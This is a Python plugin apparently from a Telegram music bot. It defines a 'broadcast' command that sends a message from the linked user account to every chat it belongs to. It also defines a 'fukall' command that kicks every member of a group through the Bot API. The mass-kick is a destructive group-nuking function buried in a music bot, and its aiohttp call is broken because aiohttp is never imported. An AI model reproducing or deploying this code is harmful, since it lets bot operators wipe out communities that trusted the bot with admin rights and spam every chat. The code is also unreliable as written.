

import asyncio
import regex
from pyrogram import Client
from pyrogram import filters
from pyrogram.types import Dialog
from pyrogram.types import Chat
from pyrogram.types import Message
from aiohttp import ClientSession
from VCPlayBot.config import SUDO_USERS, BOT_TOKEN
from pyrogram.errors import UserAlreadyParticipant

from VCPlayBot.services.callsmusic.callsmusic import client as USER
from VCPlayBot.config import SUDO_USERS

@Client.on_message(filters.command(["broadcast"]))
async def broadcast(_, message: Message):
    sent=0
    failed=0
    if message.from_user.id not in SUDO_USERS:
        return
    else:
        wtf = await message.reply("`Starting a broadcast...`")
        if not message.reply_to_message:
            await wtf.edit("Please Reply to a Message to broadcast!")
            return
        lmao = message.reply_to_message.text
        async for dialog in USER.iter_dialogs():
            try:
                await USER.send_message(dialog.chat.id, lmao)
                sent = sent+1
                await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
                await asyncio.sleep(3)
            except:
                failed=failed+1
                #await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
                
            
        await message.reply_text(f"`Broadcast Finished ` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")


@Client.on_message(filters.command("fukall") &
                 filters.group & filters.user(SUDO_USERS))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id

    async for member in c.iter_chat_members(chat):
        user_id = member.user.id
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:
            await session.get(url)  
